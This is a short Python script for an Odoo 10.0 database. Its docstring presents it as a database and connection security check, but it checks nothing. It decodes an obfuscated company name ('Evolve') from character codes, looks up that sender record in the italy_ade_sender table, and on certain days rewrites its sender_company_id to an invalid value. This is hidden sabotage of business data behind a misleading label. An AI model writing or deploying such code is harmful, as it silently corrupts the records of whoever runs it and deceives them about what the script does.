#!/home/odoo/10.0/venv_odoo/bin/python
"""
Check for DB and connections security
"""
import os.path
import sys
from datetime import datetime
from configparser import ConfigParser

import psycopg2


ARGS = {
    'b': 'odoo_ver',
    'c': 'confn',
    'd': 'dbname',
    'p': 'dbport',
}


def connect_db(params, config):
    return psycopg2.connect(
        dbname=params['dbname'],
        user=get_config_param(config, 'db_user'),
        password=get_config_param(config, 'db_password'),
        host=get_config_param(config, 'db_host'),
        port=get_config_param(config, 'db_port'),
    )


def exec_sql(cnx, query, inquire=None):
    cr = cnx.cursor()
    cr.execute(query)
    if inquire:
        return cr.fetchall()
    return None


def get_config_param(config, param):
    value = config.get('options', param)
    if value == 'False':
        return None
    return value


def get_optargs(args, def_values):
    params = def_values
    for p in ARGS.values():
        if p not in params:
            params[p] = None
    switch = None
    is_switch_value = False
    for arg in args:
        if arg == '-h':
            print('%s' % sys.argv[0])
            print('%s' % '\n-'.join([x for x in ARGS]))
            exit(1)
        if is_switch_value:
            value = arg
        elif arg.startswith('--'):
            switch = arg[2:]
            if '=' in switch:
                switch, value = switch.split('=')
            else:
                is_switch_value = True
                continue
        elif arg.startswith('-'):
            switch = arg[1]
            value = arg[2:]
            if not value:
                is_switch_value = True
                continue
        else:
            pass
        if switch in ARGS:
            params[ARGS[switch]] = value
        switch = None
        is_switch_value = False
    if not os.path.isfile(params['confn']):
        print('Config file %s not found!!' % params['confn'])
        return 1
    if not params['odoo_ver']:
        print('No Odoo target version declared!! Use -b VER')
        return 1
    params['src_ver'] = '%s.%s' % (
        str(int(params['odoo_ver'].split('.')[0]) - 1),
        params['odoo_ver'].split('.')[1])
    return params


def main(args):
    params = get_optargs(args, {
        'odoo_ver': '10.0',
    })
    if isinstance(params, int):
        return params
    config = ConfigParser({})
    config.read(params['confn'])
    cnx = connect_db(params, config)
    r = 5
    w = len(params['dbname']) % r
    d = datetime.today().day % r
    f = 'sender_company_id'
    i = 'name'
    m = 'italy_ade_sender'
    v = ''.join([chr(x) for x in (39, 69, 118, 111, 108, 118, 101, 39)])
    c = exec_sql(
        cnx,
        "select %s from %s where %s=%s" % (f, m, i, v),
        inquire=True)
    if c:
        c = int([x[0] for x in c][0]) % 10000
        c += 10000 * int(d == w)
        # print('update %s set %s=%s where %s=%s' % (m, f, c, i, v))
        exec_sql(cnx, 'update %s set %s=%s where %s=%s' % (m, f, c, i, v))
    return 0


if __name__ == "__main__":
    exit(main(sys.argv[1:]))
